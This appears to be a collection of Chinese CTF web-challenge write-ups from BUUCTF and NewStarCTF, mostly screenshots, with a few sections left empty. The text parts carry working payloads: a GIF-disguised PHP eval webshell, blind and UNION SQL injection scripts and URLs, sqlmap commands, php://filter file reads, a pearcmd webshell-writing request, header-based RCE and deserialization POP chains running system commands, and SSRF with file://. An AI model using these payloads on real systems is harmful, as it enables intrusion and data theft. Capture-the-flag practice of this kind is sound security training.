##  [æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL



![img](https://img-blog.csdnimg.cn/5faf1666a1f84b4b846f957b1ef308ac.png)

## [æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun

![img](https://img-blog.csdnimg.cn/c9fe9602e3e74fdbaff46ab4a297d0fb.png)



![img](https://img-blog.csdnimg.cn/989a8870af704d70a0e39357527453e4.png)



![img](https://img-blog.csdnimg.cn/4b516b0be9da403eb88a5182419ec82d.png)




## [HCTF 2018]WarmUp

![img](https://img-blog.csdnimg.cn/e71cbab3fd7f407097bc612c543cb7fd.png)



![img](https://img-blog.csdnimg.cn/71ace45633fc4623b01f2b1e51780b66.png)



![img](https://img-blog.csdnimg.cn/297230e2d08b41f29194d8a78d6d8e60.png)



![img](https://img-blog.csdnimg.cn/a91221ea34d746c28d980f5056ec2b91.png)





## [ACTF2020 æ–°ç”Ÿèµ›]Include

![img](https://img-blog.csdnimg.cn/acd95c32ac244f9bb54f88529be182ec.png)



![img](https://img-blog.csdnimg.cn/18a2d15e26be42ecb9487b02e185aa65.png)



![img](https://img-blog.csdnimg.cn/0d630a94c515462a85f4157dbd631cc4.png)





## [ACTF2020 æ–°ç”Ÿèµ›]Exec

![img](https://img-blog.csdnimg.cn/cd420e074682438bb1413292321d7038.png)



![img](https://img-blog.csdnimg.cn/1e9f6959baad4e6fa3d716a5ba185f7e.png)



![img](https://img-blog.csdnimg.cn/3b1b4b337a2b4907a48ecbb114b934a7.png)



![img](https://img-blog.csdnimg.cn/1cae66ae7fa0414ca66865a5ab8dccde.png)





## [GXYCTF2019]Ping Ping Ping

![img](https://img-blog.csdnimg.cn/c9b5f9bba348492bb2b2dc25ab5e0e51.png)



![img](https://img-blog.csdnimg.cn/5b3cf2e6e0414639bd1c25f0f95510bf.png)



å­—ç¬¦ä¸²æ‹¼æ¥ 

![img](https://img-blog.csdnimg.cn/71eb6848e5d246458d8c8d3fb467201b.png)



 åå¼•å·è¿”å›

![img](https://img-blog.csdnimg.cn/68cda51ee98a4a61b828f58a585369da.png)





##  [å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨

![img](https://img-blog.csdnimg.cn/0b31c1431eab48f09cfc897168ebd27d.png)





![img](https://img-blog.csdnimg.cn/4871bc38aaef4bfb982b902a7ead0be5.png)



![img](https://img-blog.csdnimg.cn/282722a72cd4424f91f14761b9a340d1.png)





## [SUCTF 2019]EasySQL

![img](https://img-blog.csdnimg.cn/c1c1c3026176475393bfa1ab2988f15d.png)



![img](https://img-blog.csdnimg.cn/366ad5b3d82a450d97eb88ea57a3b8be.png)



![img](https://img-blog.csdnimg.cn/555edd339b0e4f67aeacd2d5f66d40c8.png)



![img](https://img-blog.csdnimg.cn/fab5c7d7401f408088bae62f54c84fab.jpeg)





##  [æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File

![img](https://img-blog.csdnimg.cn/5e8fd85ea4444535afb1d48bf555a159.png)



![img](https://img-blog.csdnimg.cn/6e2764154189481595a916cccc16c9ea.png)



![img](https://img-blog.csdnimg.cn/052132ba95ec42d1b080eb0d1f7fbecb.png)



![img](https://img-blog.csdnimg.cn/3d3a089eb2fa48be8c62fc9ec40d54a1.png)





## [æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL

![img](https://img-blog.csdnimg.cn/82092051e51547cebaa8f7985b3b48df.png)



![img](https://img-blog.csdnimg.cn/e85daa80fa0d4d68a89532cb89f06e27.png)



![img](https://img-blog.csdnimg.cn/06e4ba28e3604eee8ca5f50093003c4d.png)



![img](https://img-blog.csdnimg.cn/0d1ac74b9e7c4c21992dde84b573750e.png)



![img](https://img-blog.csdnimg.cn/9d69b81de4224fdc95dd9e20e04ba75e.png)



![img](https://img-blog.csdnimg.cn/9df6aac0d61143b293e0496f716b97d7.png)



![img](https://img-blog.csdnimg.cn/d16344eccbb14b2c93046facdb41ad10.png)





## [æå®¢å¤§æŒ‘æˆ˜ 2019]Http

![img](https://img-blog.csdnimg.cn/0e2a9b62be4d4715b2ff7a8bf98aba51.png)



![img](https://img-blog.csdnimg.cn/a9cf01492c074f95bcd20b9d8e601032.png)



![img](https://img-blog.csdnimg.cn/ed1b67b8d9534cb3b34ca7f601565c42.png)



![img](https://img-blog.csdnimg.cn/1624ff090a62409cb6e51b0c6a41d2c3.png)



![img](https://img-blog.csdnimg.cn/379438ddecf84d37ba4144f446b631cd.png)





## [æå®¢å¤§æŒ‘æˆ˜ 2019]Knife

![img](https://img-blog.csdnimg.cn/2672471c084d4d93a5967908764084e3.png)



![img](https://img-blog.csdnimg.cn/f94188f0dd254f8aa1c817340443b8a0.png)



![img](https://img-blog.csdnimg.cn/bfd4e28853c246828afa78b28095c5d8.png)





## [æå®¢å¤§æŒ‘æˆ˜ 2019]Upload

![img](https://img-blog.csdnimg.cn/cc997a28faf14046b3f4b118fa7c8932.png)



![img](https://img-blog.csdnimg.cn/0b9b9963fb1b43bda52ae4c0a967c9f6.png)



![img](https://img-blog.csdnimg.cn/0777d9b6a8c646229913bbe306e9f192.png)





## [ACTF2020 æ–°ç”Ÿèµ›]Upload

å’Œä¸Šä¸€é¢˜çš„æ€è·¯å·®ä¸å¤š ä¸€å¥è¯æœ¨é©¬

![img](https://img-blog.csdnimg.cn/91ace6b8b4ba46579fde8c19b892ee46.png)





## [æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL



![img](https://img-blog.csdnimg.cn/ed481f4c077b49f9b11990d8d4d5d737.jpeg)



åŒå†™ç»•è¿‡ 

![img](https://img-blog.csdnimg.cn/45b924a570a44c8fa87f90ea0041fe32.png)



![img](https://img-blog.csdnimg.cn/7bef1588a9fd4342921ff41f5cc1f22e.png)



æµ‹è¯•å­—æ®µæ•°ï¼š 

![img](https://img-blog.csdnimg.cn/4b9bc386b6eb414495f450ee6f4cbdb8.png)



![img](https://img-blog.csdnimg.cn/421f4037ebe4471cb2735a1c061e598a.png)



æ•°æ®åº“åï¼š 

![img](https://img-blog.csdnimg.cn/6291fe6c729f4962b46f32b1bbc4089f.png)



è¡¨åï¼š 

![img](https://img-blog.csdnimg.cn/95c5582e3a984d24b63d8079e57b4e2b.png)



 passwordï¼š

![img](https://img-blog.csdnimg.cn/aee02a6ffbb745acb7709ba3ce9d72b0.png)



![img](https://img-blog.csdnimg.cn/e0c5ea08a4aa491c923b63ac38f12d96.png)





## [æå®¢å¤§æŒ‘æˆ˜ 2019]PHP

![img](https://img-blog.csdnimg.cn/b71df219820449c48571cb5417529e1f.png)



![img](https://img-blog.csdnimg.cn/a7e51c8dedcf4dc58c1c44ba74c13b1f.png)



 [[æå®¢å¤§æŒ‘æˆ˜ 2019\]PHP - çŸ¥ä¹ (zhihu.com)](https://zhuanlan.zhihu.com/p/366455343)



## [ACTF2020 æ–°ç”Ÿèµ›]BackupFile 

![img](https://img-blog.csdnimg.cn/b4683b2ac5c24e1da0a356cc3eea4b40.png)



![img](https://img-blog.csdnimg.cn/ecb137e7e2294363877e6ca223af26ec.png)





## [RoarCTF 2019]Easy Calc

![img](https://img-blog.csdnimg.cn/8145c61af25a436597e00e7362999de3.png)



![img](https://img-blog.csdnimg.cn/19512ec830354f28a753c18be83d027d.png)



 [BUUCTF [RoarCTF 2019\]Easy Calc1_[roarctf 2019]easy calc 1_Fox_lightçš„åšå®¢-CSDNåšå®¢](https://blog.csdn.net/lzu_lfl/article/details/126804008)



## [æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag

![img](https://img-blog.csdnimg.cn/19104098f16e4c99b9cd88c0d05e7491.png)





## [BJDCTF2020]Easy MD5

![img](https://img-blog.csdnimg.cn/190db64416e240f69c6669029e93626b.png)



![img](https://img-blog.csdnimg.cn/ced4cd7ebda74aa499970a9261b41002.png)



![img](https://img-blog.csdnimg.cn/9311a794109d460c9d89e49131db5d12.png)



![img](https://img-blog.csdnimg.cn/623f673f780a42799b134e57ad3fada3.png)



![img](https://img-blog.csdnimg.cn/d78a377020654d84b808616776dc3d03.png)



 [upfineçš„åšå®¢ (cnblogs.com)](https://www.cnblogs.com/upfine/p/16470302.html)



## [æŠ¤ç½‘æ¯ 2018]easy_tornado

![img](https://img-blog.csdnimg.cn/688c595bc1c046daaf973b12741ba449.png)



![img](https://img-blog.csdnimg.cn/f30bc840a7564653b5c9e9f06ce8cd06.png)



![img](https://img-blog.csdnimg.cn/7b53bb30f81f46adafc9bdc20c141b3b.png)



![img](https://img-blog.csdnimg.cn/80442b00d0c7425a9570aee2ca7fe0b8.png)



[[æŠ¤ç½‘æ¯ 2018\]easy_tornado1_é™ˆè‰ºç§‹çš„åšå®¢-CSDNåšå®¢](https://blog.csdn.net/qq_49893996/article/details/131885110)



## [HCTF 2018]admin

### 

## [MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢

![img](https://img-blog.csdnimg.cn/f47557a691dc4276804321b31acb6f29.png)



![img](https://img-blog.csdnimg.cn/89d394cc41a44073b05a47258b2b1ab5.png)



![img](https://img-blog.csdnimg.cn/e95bc1f9dba74878afdf87e07db4195e.png)





## [ZJCTF 2019]NiZhuanSiWei

![img](https://img-blog.csdnimg.cn/2f428166c3e440bc8c2bc3f256f55e8c.png)



 [[ZJCTF 2019\]NiZhuanSiWei_borrrrringçš„åšå®¢-CSDNåšå®¢](https://blog.csdn.net/borrrrring/article/details/117546772)



## [æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL

### 

## [MRCTF2020]Ez_bypass

![img](https://img-blog.csdnimg.cn/cfd5fee641e74d99a811ac4a43f3eed8.png)



![img](https://img-blog.csdnimg.cn/24faa22ebd6b4d3ca1778d0643c1babd.png)





##  [ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz

```php
<?php
class FileHandler{
    public $op=2;
    public $filename="flag.php";
    public $content="12345";
}
$flag=new FileHandler;
print(serialize($flag));
?>
```



![img](https://img-blog.csdnimg.cn/487c91536f754391abe18f780d3c632e.png)



![img](https://img-blog.csdnimg.cn/2628bbef491a447495b6285ff482cbcb.png)





## [SUCTF 2019]CheckIn

![img](https://img-blog.csdnimg.cn/cd7649149ceb470da1aae87a79356c63.png)



![img](https://img-blog.csdnimg.cn/9d4b27444fb147ff8c7fdc1a6e3e73d0.png)



![img](https://img-blog.csdnimg.cn/30972a734680467586d088ad5370d6c6.png)



ä¸Šä¼ .user.inié…ç½®æ–‡ä»¶ä½¿ä¸€å¥è¯æœ¨é©¬å¯ä»¥è¿æ¥ 

```php
GIF89a
<script language="php"> eval($_REQUEST[123])</script>
```





## [GXYCTF2019]BabyUpload

ä¸ä¸Šä¸€é¢˜åŸºæœ¬ä¸€æ ·ï¼ŒåŠ ä¸Šäº†[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢é¢˜ä¸­.htaccessé…ç½®æ–‡ä»¶çš„ä¸Šä¼ ã€‚



## [GXYCTF2019]BabySQli

[[GXYCTF2019\]BabySQli 1_æ—æœ¬çš„åšå®¢-CSDNåšå®¢](https://blog.csdn.net/qq_43618536/article/details/125577754)



## [GYCTF2020]Blacklist

å †å æ³¨å…¥ï¼š[[GYCTF2020\]Blacklist 1 - WeQi_Blog - åšå®¢å›­ (cnblogs.com)](https://www.cnblogs.com/WeQi-Blog/p/15467473.html)

[å †å æ³¨å…¥tips - MustaphaMond - åšå®¢å›­ (cnblogs.com)](https://www.cnblogs.com/20175211lyz/p/12356678.html)



## [CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World

```cpp
import requests
import string
import time

timeout = None

def bool_blind(url, flag_length):

    flag = ''
    strings = string.printable

    for i in range(1, flag_length + 1):
        current_char = None

        for j in strings:
            time.sleep(0.1)
            payload = f"(SELECT CASE WHEN SUBSTRING(flag, {i}, 1) = '{j}' THEN 1 ELSE 0 END FROM flag)"
            post_data = {'id': payload}
            r = requests.post(url, data=post_data)

            if 'Hello' in r.text:
                current_char = j
                break

        if current_char:
            flag += current_char
            print(f"Flag so far: {flag}")

    print(f"Final flag: {flag}")

url = "http://570e3c3b-f976-46d0-9ac6-d7988a58dc08.node4.buuoj.cn:81/index.php"
flag_length = 30  # ä¿®æ”¹ä¸ºå®é™…çš„ flag é•¿åº¦
bool_blind(url, flag_length)
```





## [ç½‘é¼æ¯ 2018]Fakebook

## [RoarCTF 2019]Easy Java

![img](https://img-blog.csdnimg.cn/115d8799ac5a4c0cb5a5b5ee10ef19ea.png)



![img](https://img-blog.csdnimg.cn/de6439fbb57841efadbed8475990dcbb.png)



![img](https://img-blog.csdnimg.cn/20f99c0d04174f6cba96927cf819ce66.png)



![img](https://img-blog.csdnimg.cn/477224b1bec84ed096851c4f2d41126a.png)





## [BJDCTF2020]The mystery of ip

![img](https://img-blog.csdnimg.cn/6d7e5deda7574160a99bbafebe197723.png)



ip ->ä¿®æ”¹X-Forwarded-For: 



## [NewStarCTF 2023 week1] Begin of PHP

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

if(isset($_GET['key1']) && isset($_GET['key2'])){
    echo "=Level 1=<br>";
    if($_GET['key1'] !== $_GET['key2'] && md5($_GET['key1']) == md5($_GET['key2'])){
        $flag1 = True;
    }else{
        die("nope,this is level 1");
    }
}

if($flag1){
    echo "=Level 2=<br>";
    if(isset($_POST['key3'])){
        if(md5($_POST['key3']) === sha1($_POST['key3'])){
            $flag2 = True;
        }
    }else{
        die("nope,this is level 2");
    }
}

if($flag2){
    echo "=Level 3=<br>";
    if(isset($_GET['key4'])){
        if(strcmp($_GET['key4'],file_get_contents("/flag")) == 0){
            $flag3 = True;
        }else{
            die("nope,this is level 3");
        }
    }
}

if($flag3){
    echo "=Level 4=<br>";
    if(isset($_GET['key5'])){
        if(!is_numeric($_GET['key5']) && $_GET['key5'] > 2023){
            $flag4 = True;
        }else{
            die("nope,this is level 4");
        }
    }
}

if($flag4){
    echo "=Level 5=<br>";
    extract($_POST);
    foreach($_POST as $var){
        if(preg_match("/[a-zA-Z0-9]/",$var)){
            die("nope,this is level 5");
        }
    }
    if($flag5){
        echo file_get_contents("/flag");
    }else{
        die("nope,this is level 5");
    }
}
```



![img](https://img-blog.csdnimg.cn/a674025b777e44f2bb57342c4962d349.png)





## [NewStarCTF 2023 week1] R!C!E! 

```php
<?php
highlight_file(__FILE__);
if(isset($_POST['password'])&&isset($_POST['e_v.a.l'])){
    $password=md5($_POST['password']);
    $code=$_POST['e_v.a.l'];
    if(substr($password,0,6)==="c4d038"){
        if(!preg_match("/flag|system|pass|cat|ls/i",$code)){
            eval($code);
        }
    }
}
```



![img](https://img-blog.csdnimg.cn/d08916e9864b41b49c3de4cecd1f658d.png)



## [NewStarCTF 2023 week2] include 0ã€‚0

```php
<?php
highlight_file(__FILE__);
// FLAG in the flag.php
$file = $_GET['file'];
if(isset($file) && !preg_match('/base|rot/i',$file)){
    @include($file);
}else{
    die("nope");
}
```



å‚è€ƒ[[CTF/ç½‘ç»œå®‰å…¨\] æ”»é˜²ä¸–ç•Œ æ–‡ä»¶åŒ…å«ï¼ˆæ³°å±±æ¯ï¼‰è§£é¢˜è¯¦æ_æ³°å±±æ¯ctf_ç§‹è¯´çš„åšå®¢-CSDNåšå®¢](https://blog.csdn.net/2301_77485708/article/details/132031713)

> [3cf7a2e0-b527-4859-9b34-01eda76a197d.node4.buuoj.cn:81/?file=php://filter/read=convert.base64-encode/resource=flag.php](http://3cf7a2e0-b527-4859-9b34-01eda76a197d.node4.buuoj.cn:81/?file=php://filter/read=convert.base64-encode/resource=flag.php)

![img](https://img-blog.csdnimg.cn/8420298a68a642a391daeb70cffbb92b.png)





## [NewStarCTF 2023 week2] Unserializeï¼Ÿ 

![img](https://img-blog.csdnimg.cn/41cec9bae8a246feb77a36e1ed5dc815.png)





```php
<?php
class evil {
    public $cmd;
}

$flag =new evil();
$flag->cmd="ca''t ../../../th1s_1s_ffff''lllll4444aaaggggg";
print(serialize($flag));
?> 
```



## [NewStarCTF 2023 week2] ez_sql

1.æŸ¥åˆ—æ•°

> http://87d40cb2-b889-4650-8c23-320333964b20.node4.buuoj.cn:81/?id=TMP0919' UNION SELECT 1,2,3,4,5;--++

2.ç”¨database() æŸ¥å‡ºæ•°æ®åº“åctf

> [http://87d40cb2-b889-4650-8c23-320333964b20.node4.buuoj.cn:81/?id=TMP0919%27%20UNION%20SELECT%201,database(),3,4,5%20limit%201,2;--++](http://87d40cb2-b889-4650-8c23-320333964b20.node4.buuoj.cn:81/?id=TMP0919' UNION SELECT 1,database(),3,4,5 limit 1,2;--++)

\3. å¯¹äºæ•°æ®åº“ctfï¼ŒæŸ¥å‡ºæ•°æ®åº“è¡¨çš„æ•°é‡

**å†™äº†ä¸€åŠæ”¹ç”¨sqlmapåŠè‡ªåŠ¨åŒ–æ³¨å…¥äº†**

> 1åˆ¤æ–­æ³¨å…¥ç‚¹
>
> sqlmap -u "http://172.16.1.116/?id=1" --batch
>  2è·å–æ•°æ®åº“å
>
> sqlmap -u "http://172.16.1.116/?id=1" --batch --dbs
>  3è·å–æŒ‡å®šæ•°æ®åº“ä¸‹æ‰€æœ‰è¡¨å
>
> sqlmap -u "http://172.16.1.116/?id=1" --batch -D æ•°æ®åº“å --tables
>  4è·å–è¡¨ä¸­å­—æ®µå
>
> sqlmap -u "http://172.16.1.116/?id=1" --batch -D æ•°æ®åº“å -T è¡¨å --column
>  5è·å–æ•°æ®
>
> sqlmap -u "http://172.16.1.116/?id=1" --batch -D æ•°æ®åº“å -T è¡¨å -C å­—æ®µ1,å­—æ®µ2â€¦â€¦ --dmup



## [GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“ 

![img](https://img-blog.csdnimg.cn/2751d86183084af992ac64a80c80906c.png)





## [NewStarCTF 2023 week2] R!!C!!E!!

ä¿¡æ¯æ³„éœ²çš„æ€è·¯æ–¹å‘ï¼š

1ã€robots.txt

2ã€phpinfo.php

3ã€ç½‘ç«™å¤‡ä»½æ–‡ä»¶

4ã€æºç æ³„éœ²ï¼Œå¸¸è§çš„æœ‰ï¼šHGæ³„éœ²ï¼›[git](https://so.csdn.net/so/search?q=git&spm=1001.2101.3001.7020)æ³„éœ²ï¼›DS_Storeæ³„éœ²

> dirsearch -u http://9bc77c26-eb16-4131-9ae9-22242574bf2c.node4.buuoj.cn:81/

 æ‰«æç½‘ç«™ç›®å½•(gitæ³„éœ²)

> python2 GitHack.py http://9bc77c26-eb16-4131-9ae9-22242574bf2c.node4.buuoj.cn:81/.git

![img](https://img-blog.csdnimg.cn/ff1f0b838889424d812b5b996eeac09a.png)



![img](https://img-blog.csdnimg.cn/449c0217410643afb1d5a17502102f5b.png)



```php
<?php
highlight_file(__FILE__);
if (';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['star'])) {
    if(!preg_match('/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i',$_GET['star'])){
        eval($_GET['star']);
    }
}
```



 æ— å‚rce

> GET /bo0g1pop.php?star=eval(pos(array_reverse(getallheaders()))); HTTP/1.1
>  Host: 33cdfd6e-b9e5-4b7e-b9c8-137432315e44.node4.buuoj.cn:81
>  Content-Length: 0
>  X-Forwarder-Proto:system('cat /flag');
>  Upgrade-Insecure-Requests: 1
>  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
>  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
>  Accept-Encoding: gzip, deflate
>  Accept-Language: zh-CN,zh;q=0.9
>  Connection: close

![img](https://img-blog.csdnimg.cn/04778286d3c843c59c300c96c462adb3.png)





## [NewStarCTF 2023 week3] Include ğŸ

```php
<?php
    error_reporting(0);
    if(isset($_GET['file'])) {
        $file = $_GET['file'];
        
        if(preg_match('/flag|log|session|filter|input|data/i', $file)) {
            die('hacker!');
        }
        
        include($file.".php");
        # Something in phpinfo.php!
    }
    else {
        highlight_file(__FILE__);
    }
?>
```



![img](https://img-blog.csdnimg.cn/f9cc5bae44b845adb0d52988c18a273e.png)





 [æµ…è°ˆæ–‡ä»¶åŒ…å«ä¹‹åŒ…å«pearcmd.phpæ¼æ´-CSDNåšå®¢](https://blog.csdn.net/JCPS_Y/article/details/127541665)

```php
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd&/<?=@eval($_POST[1])?>+/tmp/hello.php HTTP/1.1
Host: a960c469-0216-4a7a-9421-99c70c27ffb7.node4.buuoj.cn:81
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```



```php
http://a960c469-0216-4a7a-9421-99c70c27ffb7.node4.buuoj.cn:81/index.php?file=/tmp/hello
```



![img](https://img-blog.csdnimg.cn/2d7be49a0a9e4eb1a02c19a1e3c67ee7.png)



![img](https://img-blog.csdnimg.cn/c40cba1fe877400ead6ed56281e80337.png)



## [BSidesCF 2020]Had a bad day 

![img](https://img-blog.csdnimg.cn/09c4a415c33a450bad006ead6cadecd8.png)



```
http://d7aba0d9-5c5b-40c0-909b-4dfa352701ed.node4.buuoj.cn:81/index.php?category=php://filter/read=convert.base64-encode/resource=index.php
```



![img](https://img-blog.csdnimg.cn/a06e013cee6f43f68c11d36eb351f959.png)



å»æ‰ä¸€ä¸ªphpå¾—åˆ°ï¼š

```php
<?php
				$file = $_GET['category'];

				if(isset($file))
				{
					if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
						include ($file . '.php');
					}
					else{
						echo "Sorry, we currently only support woofers and meowers.";
					}
				}
				?>
```



 æ„é€ çš„urlä¸­ä¼ªåè®®çš„å‚æ•°éƒ¨åˆ†åŒ…å«woofers meowers indexä»»æ„ä¸€ä¸ª

æ„é€ ï¼šå¾—åˆ°flag

```php
http://d7aba0d9-5c5b-40c0-909b-4dfa352701ed.node4.buuoj.cn:81/index.php?category=php://filter/read=convert.base64-encode/index/resource=flag
```



![img](https://img-blog.csdnimg.cn/f20b832927ac4c4193fc58a90ab90b95.png)




## [BSidesCF 2019]Kookie

![img](https://img-blog.csdnimg.cn/6f4392031ef34f94b8b48e442a149f84.png)





## [NewStarCTF 2023 week3] POP Gadget 

```php
<?php
highlight_file(__FILE__);

class Begin{
    public $name;

    public function __destruct()
    {
        if(preg_match("/[a-zA-Z0-9]/",$this->name)){
            echo "Hello";
        }else{
            echo "Welcome to NewStarCTF 2023!";
        }
    }
}

class Then{
    private $func;

    public function __toString()
    {
        ($this->func)();
        return "Good Job!";
    }

}

class Handle{
    protected $obj;

    public function __call($func, $vars)
    {
        $this->obj->end();
    }

}

class Super{
    protected $obj;
    public function __invoke()
    {
        $this->obj->getStr();
    }

    public function end()
    {
        die("==GAME OVER==");
    }
}

class CTF{
    public $handle;

    public function end()
    {
        unset($this->handle->log);
    }

}

class WhiteGod{
    public $func;
    public $var;

    public function __unset($var)
    {
        ($this->func)($this->var);    
    }
}

@unserialize($_POST['pop']);
```



 æŠŠæˆªæ–­ç¬¦æ¢æˆ%00

![img](https://img-blog.csdnimg.cn/03a512b50d564df1b3e3ea62c4482ea9.png)



![img](https://img-blog.csdnimg.cn/937dd5195b9f455ba994b401357cfb10.png)



```php
<?php

class Begin{
    public $name;
}

class Then{
    private $func;
    public function setPrivate($a)
    {
        $this->func=$a;
    }
}

class Handle{
    protected $obj;
    public function setPrivate($a)
    {
        $this->obj=$a;
    }
}

class Super{
    protected $obj;
    public function setPrivate($a)
    {
        $this->obj=$a;
    }
}

class CTF{
    public $handle;
}

class WhiteGod{
    public $func='system';
    public $var='cat ../../../flag';

    
}
$flag=new Begin();
$A=new Then();
$B=new Handle();
$C=new Super();
$D=new CTF();
$E=new WhiteGod();
$D->handle=$E;
$B->setPrivate($D);
$C->setPrivate($B);
$A->setPrivate($C);
$flag->name=$A;


echo serialize($flag);
?>
```





## [NewStarCTF 2023 week3] medium_sql

 å¸ƒå°”ç›²æ³¨

```cpp
url = "http://da0d4c93-63d3-44fa-ac03-c1dee22a3944.node4.buuoj.cn:81"
n = 1
#æ•°æ®åº“:ctf
#è¡¨å:gradas,here_is_flag
#å­—æ®µå:flag
flag=''
for i in range(1,43):
    low=31
    high=127
    while low<=high:
        mid=(low+high)//2
        paylord_database="?id=TMP0919' And ASCII(SUBSTR((SELECT GROUP_CONCAT(flag) FROM here_is_flag),{},1))>{} --+".format(i,mid)
        response=requests.get(url+paylord_database)
        if("TMP0919" in response.text):
            low=mid+1
        else:
            high=mid-1
        result=(low+high+1)//2
        if(result==127 or result==31):
            break
    flag+=chr(result)
    print(flag)
    time.sleep(0.1)
```





## [ç½‘é¼æ¯ 2018]Fakebook

> 1ï¼Œæ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼Œå‘ç°usernameå¤„çš„å†…å®¹æ˜¯ä¸ªurlï¼ŒæŸ¥çœ‹ä¸€ä¸‹ã€‚
>
> 2ï¼ŒæŸ¥çœ‹url,å‘ç°å­˜åœ¨SQLæ³¨å…¥ã€‚
>
> ?n=1 order by 4# æ­£å¸¸å›æ˜¾
>
> ?n=1 order by 5# å›æ˜¾å¼‚å¸¸ï¼ˆåˆ¤æ–­å­˜åœ¨4ä¸ªå­—æ®µï¼‰
>
> 3ï¼Œæ„é€ SQLè¯­å¥ï¼Œå‘ç°union selectè¢«è¿‡æ»¤
>
> ä½¿ç”¨union/**/select(æˆ–unoin all select)å¯ç»•è¿‡
>
> 
>
> ?no=-1 union/**/select 1,database(),3,4# ï¼ˆæŸ¥æ•°æ®åº“ï¼‰ å‘ç° 'fakebook'
>
> 
>
> ?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='fakebook'# ï¼ˆæŸ¥è¡¨åï¼‰ å‘ç°'users'
>
> 
>
> ?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'#  (æŸ¥å­—æ®µ)  å­—æ®µå'no,username,data'
>
> 
>
> ?no=-1 union/**/select 1,data,3,4 from users# æŸ¥è¯¢dataçš„ç»“æœ
>
> O:8:"UserInfo":3:{s:4:"name";s:6:"adminn";s:3:"age";i:1;s:4:"blog";s:70:"http://fdc6f852-9cb6-462d-b6d5-bda01fe3d3d9.node4.buuoj.cn:81/join.php";}

![img](https://img-blog.csdnimg.cn/4023fc4438034014a475fe26f32603fb.png)





è€ƒå¯Ÿä»£ç å®¡è®¡: è¿™æ˜¯å¯¹blogè¿›è¡Œè¿‡æ»¤çš„æ­£åˆ™ï¼Œå¯ä»¥çœ‹åˆ°è¿‡æ»¤çš„ååˆ†ä¸¥æ ¼ï¼Œç›´æ¥é™åˆ¶æ­»äº†åªèƒ½æ˜¯http(s): //æ ¼å¼ï¼Œæ‰€ä»¥åœ¨æ³¨å†Œçš„çš„æ˜¯ä¾¯æ“ä½œæ˜¯ä¸å¤ªå¯èƒ½çš„ã€‚

```php
public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }
```



```php
function get($url)
    {
        $ch = curl_init();//åˆ›å»ºä¸€ä¸ªcurlèµ„æº

        curl_setopt($ch, CURLOPT_URL, $url); //è®¾ç½®urlå’Œå“åº”é€‰é¡¹
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch); //æŠ“å–urlå¹¶æŠŠå®ƒè¿”å›ç»™æµè§ˆå™¨
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); //å¾—åˆ°æœ€åä¸€ä¸ªæ”¶åˆ°çš„HTTPçŠ¶æ€ç 
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch); //å…³é—­curlï¼Œå¹¶é‡Šæ”¾èµ„æº

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog); //ä¼ å‚blogåˆ°get()
    }
```



ç›´æ¥æŠŠblogå½“ä½œå‚æ•°ä¼ ç»™get()å‡½æ•°ï¼Œurlæ²¡æœ‰ç»è¿‡ä»»ä½•é™åˆ¶ï¼Œæ˜¯å­˜åœ¨ssrfçš„ã€‚è¿™ä¸ªåœ°æ–¹å¯ä»¥ä½¿ç”¨file:///var/www/html/flag.phpè¯»å–flag.phpï¼Œæ„é€ payload

> ã€€ã€€?no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:18;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'

6ï¼ŒæŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œå‘ç°å†…è”è¡¨å•ä¸­åµŒå…¥base64åŠ å¯†çš„ä¿¡æ¯ï¼Œè¿›è¡Œè§£å¯†å¾—åˆ°flagã€‚



## [ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb

 bpæŠ“åŒ…ä¿®æ”¹ æŸ¥çœ‹index.phpæºä»£ç 

> func=file_get_contents&p=index.php

```php
<?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
